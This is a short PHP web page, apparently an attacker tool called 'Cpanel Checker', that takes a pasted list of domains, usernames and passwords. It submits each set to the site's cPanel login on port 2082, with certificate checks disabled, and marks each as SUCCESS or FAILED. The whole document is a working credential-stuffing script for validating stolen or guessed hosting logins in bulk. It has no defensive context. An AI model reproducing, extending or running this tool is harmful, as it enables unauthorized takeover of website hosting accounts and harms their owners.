<title> Cpanel Checker - Alarg53 </title>   
<form method="POST">
    <br>
    <center>
    <h1>Cpanel Checker</h1>
    <textarea name="webmails" placeholder="domain.com|user|pass" style="width:50%;height:300px;border:1px dashed #555"></textarea><br>
    <input type="submit" value="Start Scan Webmails" name="start"><br>
</form>
<?php 
    set_time_limit(0);
    error_reporting(0);
    @apache_setenv('no-gzip', 1);//comment this out if you use nginx instead of apache
    @ini_set('zlib.output_compression', 0);
    @ini_set('implicit_flush', 1);
    for($i = 0; $i < ob_get_level(); $i++) { ob_end_flush(); }
    ob_implicit_flush(1);
    $detali = explode("\r\n", $_POST['webmails']);
    $search = array("http://","https://",":2082");
    
    if($_POST['start']) {
        echo "<br><table style='width:50%;border:1px dotted #111;'>
        <tr>
            <td align='center'><strong>Host</strong></td>
            <td><strong>Username</strong></td>
            <td><strong>Password</strong></td>
            <td><strong>Status</strong></td>";
        foreach($detali as $detalis) {
            $content = explode("|", $detalis);
            $domain = str_replace($search, "",$content[0]);
            $email = $content[1];
            $pass = $content[2];
            print checker($domain,$email,$pass);
        }
    }
    
    function checker($domain,$email,$pass) {
        $ip = gethostbyname($domain);
        $url = "http://{$ip}:2082/login"; //if the port of cpanel is 2083 changed it => http to https and 2082 to 2083
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl, CURLOPT_HEADER, 0);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, "user={$email}&pass={$pass}");
        curl_setopt($curl, CURLOPT_TIMEOUT, 10);
        curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
        $result = curl_exec($curl);
        curl_close($curl);
        if(preg_match('#logout#',$result)) {
                        print '<tr><td align="center">'.$domain.'</td><td>'.$email.'</td><td>'.$pass.'</td><td><strong><font color=green>SUCCESS</font></strong></tr>';
 
 
            return;
        } else {
            print '<tr><td align="center">'.$domain.'</td><td>'.$email.'</td><td>'.$pass.'</td><td><strong><font color=red>FAILED</font></strong></tr>';
 
        return;
        }
    }
    
?>
